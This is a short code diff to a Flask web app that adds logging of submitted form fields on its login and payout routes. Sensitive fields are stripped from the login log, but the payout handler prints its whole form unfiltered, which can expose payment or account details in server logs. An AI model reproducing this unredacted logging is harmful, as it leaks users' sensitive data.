@@ -10,6 +10,14 @@ def home():
 
 @app.route("/login", methods=["POST"])
 def login():
+    # Print the submitted form fields, excluding sensitive fields.
+    data = request.form.to_dict()
+
+    for key in ["password", "card_number", "cvv", "pin"]:
+        data.pop(key, None)
+
+    print("LOGIN FORM:", data, flush=True)
+
     return redirect("/payout")
 
 
@@ -19,7 +27,11 @@ def payout():
 
 
 @app.route("/payout/select", methods=["POST"])
-def select_payment():
+def payout_select():
+    data = request.form.to_dict()
+
+    print("PAYOUT FORM:", data, flush=True)
+
     method = request.form.get("method")
 
     if method == "hexer":
@@ -52,5 +64,6 @@ def google():
 if __name__ == "__main__":
     app.run(
         host="0.0.0.0",
-        port=5000
+        port=5000,
+        debug=False
     )
